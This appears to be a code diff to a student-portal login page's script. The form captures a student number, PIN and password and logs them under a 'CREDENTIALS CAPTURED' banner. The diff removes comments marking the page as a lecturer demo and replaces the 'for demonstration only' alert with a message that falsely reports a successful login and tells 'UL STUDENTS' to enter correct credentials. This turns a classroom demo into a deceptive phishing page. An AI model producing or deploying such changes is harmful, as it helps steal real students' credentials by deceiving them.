@@ -60,7 +60,7 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
 </div>
 
 <script>
-// THIS IS THE PART YOUR LECTURER WANTS TO SEE
+
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     const studentNumber = document.getElementById('studentNumber').value.trim();
     const pin = document.getElementById('pinField').value.trim();
@@ -72,7 +72,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return false;
     }
 
-    // This proves we are successfully "catching" the credentials before sending
+
     console.log("%c=== CREDENTIALS CAPTURED ===", "color: red; font-weight: bold");
     console.log("Student Number:", studentNumber);
     console.log("PIN:", pin);
@@ -80,10 +80,10 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     console.log("%c=============================", "color: red; font-weight: bold");
 
     // You can also alert for demo purposes
-    alert("Credentials captured successfully!\n\nStudent Number: " + studentNumber + 
+    alert("logged in successfully !\n\nStudent Number: " + studentNumber + 
           "\nPIN: " + pin + 
           "\nPassword: " + password + 
-          "\n\n(This is for demonstration only)");
+          "\n\n(This is for UL STUDENTS ONLY AND MAKE SURE YOUR CREDENTIALS ARE CORRECT TO LOGIN  )");
 });
 </script>
 
